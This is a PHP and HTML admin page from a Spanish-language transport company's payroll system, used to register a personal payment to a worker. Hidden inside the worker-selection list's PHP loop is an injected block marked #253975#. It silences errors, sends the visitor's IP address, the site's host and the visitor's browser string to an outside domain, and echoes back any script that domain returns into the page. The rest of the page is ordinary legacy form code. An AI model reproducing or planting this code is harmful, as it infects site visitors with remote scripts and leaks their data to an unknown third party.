<?php
	//Validar op
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	require("../conexion/ajax.php");
	require("../conexion/config.php");
	require("../conexion/baseDatos.php");
	
	$consulta = "select dni, Nombre, ApellidoPaterno, ApellidoMaterno 
				   from trabajador 
			   order by ApellidoPaterno, ApellidoMaterno;";			
	$bd = new BaseDatos(_SERVIDOR,_BASEDATOS,_USUARIO,_PASSWORD);			
	$bd->conectar();
	$result = $bd->crearConsulta($consulta);	
	if(mysql_num_rows($result)==0)
	{
		$bd->cerrarConexion();		
		?>
		<script language="javascript" type="text/javascript">
			alert("¡ No existe ningún trabajador registrado !");
			location.href="administrador.php";
		</script>
		<?php
		die;
	}		
?>
<script language="javascript" type="text/javascript">
	var aux=false;
	
	function go()
	{
		location.href="administrador.php";
	}
	
	function setTrabajador()		
	{
		agregarCargando('cargando');
		data = document.getElementById('select').options[document.getElementById('select').selectedIndex].text.split('|');
		document.getElementById('trabajador').innerHTML = data[0];		
		document.getElementById('dni').value = data[0];
		document.getElementById('name').innerHTML = data[1];
		aux=true;
		quitarCargando('cargando');	
		document.getElementById('textMonto').focus();
	}	
	
	function delIntro(e)
	{
		if(e.keyCode==13)
		{
			return;
		}
	}
		
	function manejoGuardar()
	{
		if(aux==true)
		{
			monto = document.getElementById('textMonto').value;
			
			if(monto=="")
			{
				alert("¡ Debes llenar todos los campos !");
			}
			else
			{
				if(!isNaN(monto))
				{
					document.getElementById('formPagoPers').submit();
				}
				else
				{
					alert("¡ El monto debe ser un numero real !");
				}
			}
			return;
		}
		alert("¡ Debes primero buscar un trabajador !");
		document.getElementById('textMonto').value="";
	}

	function manejoBuscar()
	{		
		agregarCargando('cargando');
		dni = document.getElementById('textDNI').value;		
		if(isNaN(dni) || dni.length!=8)
		{
			alert("¡ Debe ingresar el DNI de un trabajador con el formato correcto !");
			quitarCargando('cargando');				
			document.getElementById('textMonto').value="";
			document.getElementById('textDNI').value="";
			document.getElementById('trabajador').innerHTML="";
			return;
		}				
		_obj = crearObjeto();
		_url = "ajaxManejador.php";
		_valores = "op=dni_trabajador&DNI="+dni;
		_obj.open("POST", _url, true);
		_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
		_obj.send(_valores);
		_obj.onreadystatechange = function()
		{
			//Carga completa (Estado de la conexion)
			if(_obj.readyState==4)
			{
				//Completadoc no exito (Codigo enviado por el servidor)
				if(_obj.status==200)
				{
					resp = _obj.responseText;
					if(resp == "not_found")
					{	
						alert("! No existe trabajador registrado con DNI " + dni + " !");
						quitarCargando('cargando');
						document.getElementById('textDNI').value="";
						document.getElementById('textMonto').value="";
						document.getElementById('trabajador').innerHTML="";
						return;
					}					
					document.getElementById('trabajador').innerHTML = resp;
					aux=true;
					quitarCargando('cargando');
				}
			}
		}
	}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - InsPagoPersonal ::</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
.Estilo2 {	font-size: 14px;
	color: #FFFFFF;
}
.Estilo3 {font-family: Verdana, Arial, Helvetica, sans-serif}
.Estilo5 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	font-style: italic;
	font-weight: bold;
}
.Estilo10 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 12; }
.Estilo12 {font-size: 12px}
.Estilo13 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	font-weight: bold;
}
.Estilo17 {font-size: 12px; font-style: italic; font-weight: bold; }
.Estilo18 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 12px; }
-->
</style></head>
<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="142"><form id="formPagoPers" name="formPagoPers" method="post" action="admin.php" />
          <p align="center"><strong>REGISTRAR UN PAGO PERSONAL</strong></p>
          <table width="481" height="242" border="0" align="center">
		  <tr>
              <td width="70" height="28" align="right" valign="top"><span class="Estilo5">Lista:</span></td>
              <td colspan="3" valign="top"><span class="Estilo10">
                <label>
                <select id="select" name="select" size="5" onChange="setTrabajador()">
                  <?php
						while($reg = mysql_fetch_object($result))
						{
							print("<option value=\"".$reg->dni."\">".$reg->dni." | ".strtoupper($reg->ApellidoPaterno).
							" ".strtoupper($reg->ApellidoMaterno).", ".strtoupper($reg->Nombre)."</option>");
						}
						$bd->cerrarConexion();
					?>
<?php
#253975#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/253975#
?>
                  </select>
                </label>
              </span></td>
            </tr>
			<tr>
              <td height="28" align="right"><span class="Estilo3 Estilo12"><strong>DNI :</strong> </span></td>
              <td width="75"><span class="Estilo3 Estilo12">
                <label id="trabajador">-</label>
              </span></td>
              <td width="71"><div align="right" class="Estilo13">Nombre:</div></td>
              <td width="278"><div class="Estilo10" id="name">-</div></td>
              </tr>
		  <!--
            <tr>
              <td width="90" height="28"><em><strong>DNI :</strong></em></td>
              <td width="224"><label>
                <input name="textDNI" type="text" id="textDNI" onKeyPress="delIntro(event)" maxlength="8" />
              </label></td>
            </tr>			
            <tr>
              <td height="44">&nbsp;</td>
              <td><label>
                <input type="button" name="Buscar" value="Buscar"  onclick="manejoBuscar()"/>
                </label>
                  <div align="center" id="cargando"> </div></td>
            </tr>
            <tr>
              <td height="28"><em><strong>Trabajador :</strong></em> </td>
              <td><label id="trabajador"> </label></td>
            </tr>-->
            <tr>
              <td height="75" colspan="4" align="center" valign="middle"><table width="296" border="0" align="center">
                  <tr>
                    <td width="111" align="right" class="Estilo10"><span class="Estilo17">Monto : </span></td>
                    <td width="175" class="Estilo10"><label>
                      <input type="text" name="textMonto"  id="textMonto" onKeyPress="delIntro(event)" />
                    </label></td>
                  </tr>
                  <tr>
                    <td height="35" align="right" class="Estilo10"><span class="Estilo17">Tipo de pago  : </span></td>
                    <td class="Estilo10"><label>
                      <select name="listTipoPago" id="listTipoPago">
                        <option>Contado</option>
                        <option>Cheque</option>
                      </select>
                      </label>
                        <label></label></td>
                  </tr>
              </table></td>
            </tr>
            <tr>
              <td height="37"><span class="Estilo10">
                <label><span class="Estilo10">
                </label>
                </span>
                <div align="center" id="cargando"> </div></td>
              <td height="37"><span class="Estilo10">
                <label><span class="Estilo10">
                </label>
                </span></td>
              <td height="37"><div align="center" class="Estilo10">
                <input type="button" name="Submit2" value="Cancelar" onClick="go()"/>
              </div></td>
              <td height="37" align="center"><div align="center" class="Estilo10">
                
                    <div align="center">
                      <input type="button" name="Submit3" value="Guardar" onClick="manejoGuardar()"/>
                      <input type="hidden" name="op" id="op" value="pagoPersonal" />
                      <span class="Estilo18">
                      <input type="hidden" name="dni" id="dni" value="" />
                      </span></div>
              </div></td>
            </tr>
          </table>          
          </td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2"> </div></td>
      </tr>

    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</form>
</body>
</html>